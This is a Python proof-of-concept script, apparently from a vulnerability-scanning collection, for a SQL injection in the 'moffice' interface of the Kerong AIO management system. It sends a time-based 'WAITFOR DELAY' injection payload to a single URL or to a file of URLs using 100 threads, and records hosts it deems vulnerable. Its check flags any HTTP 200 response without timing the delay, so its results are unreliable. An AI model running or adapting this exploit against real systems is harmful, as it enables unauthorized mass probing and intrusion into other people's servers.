import requests,sys,argparse,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'

def banner():
    test = """
┌──────────────────────────────────────────────────────────────────────────────┐
│                                                                              │
│                         ┌─────────────────────────────────────┐              │
│                         │               ( •_•)                │              │
│                         │              / ︻╦╤─                               
│                         │             | '科荣 AIO 管理系统'漏洞安全漏洞扫描工具                
│                         │              \─╤╦═                  │              │
│                         └─────────────────────────────────────┘              │
│                                                                              │
│                  * 🚀🛡️🔐🔍 - 扫描系统的潜在漏洞，保持系统安全！author:QXQ         │
│                  * 🛠️📈🔍 - 定期使用，修复问题，减少风险！     date:2024-9-13  
│                  * 🕵️‍♂️💻🔧 - 保障系统稳定，防止攻击！          version:1.0.0 
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘

"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='科荣 AIO 管理系统 moffice接口处存在SQL注入漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = "/moffice?op=showWorkPlan&planId=1';WAITFOR+DELAY+'0:0:5'--&sid=1"
    url = target+payload_url
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
        'Accept':'text/html,application/xhtml+xml,application/x',
    }
    
    try:
        res = requests.get(url=url,headers=headers,verify=False,timeout=15)

        if res.status_code == 200:
            print(f"[+]{GREEN}该url存在漏洞{target}\n{RESET}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+"\n")
                return True
        else:
            print(f"[-]该url不存在漏洞")
    except :
        print(f"[*]该url存在问题")
        return False

if __name__ == '__main__':
    main()
